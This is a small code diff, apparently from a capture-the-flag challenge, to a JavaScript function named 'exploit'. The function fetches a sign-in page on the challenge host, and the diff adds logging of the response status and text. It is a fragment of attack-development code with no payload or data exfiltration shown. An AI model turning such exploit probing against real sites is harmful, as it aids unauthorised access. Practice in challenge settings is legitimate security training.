@@ -2,6 +2,9 @@
 (async function exploit() {
         var dt = await fetch("https://xnotes.qualif.hackerlab.bj/sign_in.php", {mode: 'no-cors'});
         var statusCode = dt.status;
+        console.log(`code = ${statusCode}`);
+        var text = await dt.text();
+        console.log(`text = ${text}`);
         /*var headersString = "";
 
         dt.headers.forEach((value, name) => {
